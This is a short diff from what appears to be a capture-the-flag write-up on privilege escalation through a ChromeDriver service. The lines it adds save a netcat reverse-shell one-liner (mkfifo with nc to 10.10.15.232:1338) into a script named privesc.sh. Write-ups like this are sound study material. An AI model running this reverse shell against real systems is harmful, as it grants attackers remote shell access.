@@ -452,5 +452,9 @@ curl -X POST localhost:9515/session -d {"capabilities": {"alwaysMatch": {"goog:c
 
 This is the command i have compiled using the article
 
-Now ill create the binary 
+Now ill create the script 
+
+```python
+dev@store:/opt/google/chrome$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.232 1338 >/tmp/f' > ../../../home/dev/privesc.sh
+```
 
